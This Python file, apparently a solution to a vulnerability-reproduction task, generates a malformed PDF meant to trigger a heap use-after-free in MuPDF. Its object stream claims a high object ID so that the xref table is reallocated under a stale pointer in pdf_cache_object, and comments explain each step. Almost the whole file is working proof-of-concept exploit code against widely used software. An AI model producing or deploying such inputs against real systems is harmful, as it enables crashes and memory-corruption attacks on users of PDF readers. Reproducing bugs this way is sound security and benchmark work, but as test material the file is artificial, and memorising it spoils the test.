import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in MuPDF.
        # It occurs when `pdf_cache_object` holds a pointer to a `pdf_xref_entry` (on stack),
        # and then calls `pdf_load_obj_stm`.
        # Inside `pdf_load_obj_stm`, the code iterates over the indices defined in the object stream.
        # For each object in the stream, it updates the global xref table.
        # If an object ID in the stream is larger than the current xref table capacity, the table is reallocated.
        # This invalidates the pointer held in `pdf_cache_object`.
        # Upon return, `pdf_cache_object` accesses the stale pointer.

        # To trigger this:
        # 1. Create a PDF with a small initial xref size (e.g., 4).
        # 2. Define an Object Stream (Obj 2) that claims to contain a very high Object ID (e.g., 20000).
        # 3. Define Object 1 as being stored inside Object Stream 2.
        # 4. Access Object 1 (e.g., via Root).
        # 5. This calls `pdf_cache_object(1)` -> `pdf_load_obj_stm(1, 2)`.
        # 6. `pdf_load_obj_stm` sees index for 20000, calls `pdf_get_xref_entry(20000)`, triggering resize.
        # 7. UAF occurs when unwinding to `pdf_cache_object(1)`.

        out = []
        out.append(b"%PDF-1.5")
        out.append(b"%\xe2\xe3\xcf\xd3")
        
        def get_current_len():
            return sum(len(x) + 1 for x in out)
            
        # Obj 2: Object Stream
        obj2_id = 2
        obj2_offset = get_current_len()
        
        # Indices: "1 0 20000 10" (length 12)
        # We append a space to make it length 13, so First can be 13
        # Objects start at offset 13 relative to stream
        # Obj 1 at 0: "<< >>" (len 5)
        # Padding: need to reach 10. 5 bytes used. 5 bytes padding.
        # Obj 20000 at 10: "<< >>"
        
        indices = b"1 0 20000 10 "
        obj1_data = b"<< >>"
        padding = b" " * 5
        obj20k_data = b"<< >>"
        
        stream_content = indices + obj1_data + padding + obj20k_data
        
        # /N 2: two objects
        # /First 13: objects start after indices
        out.append(f"{obj2_id} 0 obj".encode())
        out.append(f"<< /Type /ObjStm /N 2 /First {len(indices)} /Length {len(stream_content)} >>".encode())
        out.append(b"stream")
        out.append(stream_content)
        out.append(b"endstream")
        out.append(b"endobj")
        
        # Obj 3: XRef Stream
        obj3_id = 3
        obj3_offset = get_current_len()
        
        # Entries: 0, 1 (in stm 2), 2 (offset), 3 (offset)
        # W [1, 4, 2]
        
        # Entry 0: Type 0, 0, 65535
        e0 = b"\x00" + (0).to_bytes(4, 'big') + (65535).to_bytes(2, 'big')
        # Entry 1: Type 2, Stm 2, Idx 0
        e1 = b"\x02" + (2).to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        # Entry 2: Type 1, Offset obj2_offset
        e2 = b"\x01" + obj2_offset.to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        # Entry 3: Type 1, Offset obj3_offset
        e3 = b"\x01" + obj3_offset.to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        
        xref_data = e0 + e1 + e2 + e3
        
        out.append(f"{obj3_id} 0 obj".encode())
        # /Size 4 (important! small size to force resize)
        # /Root 1 0 R (triggers access to Obj 1)
        out.append(f"<< /Type /XRef /Size 4 /Root 1 0 R /W [1 4 2] /Length {len(xref_data)} >>".encode())
        out.append(b"stream")
        out.append(xref_data)
        out.append(b"endstream")
        out.append(b"endobj")
        
        # Trailer
        out.append(b"startxref")
        out.append(str(obj3_offset).encode())
        out.append(b"%%EOF")
        
        return b"\n".join(out)